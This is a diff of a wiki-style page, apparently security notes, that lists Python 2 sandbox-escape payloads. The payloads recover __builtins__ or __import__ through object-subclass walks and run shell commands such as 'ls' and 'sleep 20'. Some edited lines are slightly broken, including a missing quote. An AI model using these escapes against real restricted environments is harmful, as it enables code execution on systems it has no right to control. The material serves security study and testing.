@@ -185,43 +185,57 @@ __builtin__.__dict__['__import__']("os").system("ls")
 {% tabs %}
 {% tab title="Python2" %}
 ```python
-# 1 : Try to reload __builtins__
-reload(__builtins__)
-__builtins__["__import__"]('os').system('ls')
-__builtins__["__import__"]('time').sleep(20)
+# 1.
+__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
+__builtins__['__import__']('os').system('sleep 20')
 
-# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
-().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
-# Execute (another method)
+
+# 2 : 
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
-# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
+i=()
+
+
+# 3 : Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")
+
 
 # Or you could recover __builtins__ in make eveything easier
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtins__["__import__"]('os').system('ls')
 
 
-# 4
-cmd = '''i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')'''
+# 4 : Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
+#().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
+i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')
+
 
 # 5
-cmd = '''{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 20')'''
+{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 20')
 
-#6
-cmd = '''''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()'''
+
+
+#6 - check
+{}.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()
+# 6 - check
+().__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()
+
 
 #7
 ##### Steps : First restore "builtins", then import "builtin" and them use builtin to import "os"
-cmd = '''
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtin__=__builtins__["__import__"]('__builtin__')
 __builtin__.__dict__['__import__']('os').system(ls')
-'''
 
 
 # Or you could obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
+
+
+# 120 : # This will not restore __builtins__ , but can be used if some modules are restricted in __builtins__
+# Working : Try to reload __builtins__ but we need the reload() builtin function in __bultins__
+reload(__builtins__)
+__builtins__["__import__"]('os').system('ls')
+__builtins__["__import__"]('time').sleep(20)
 ```
 {% endtab %}
 
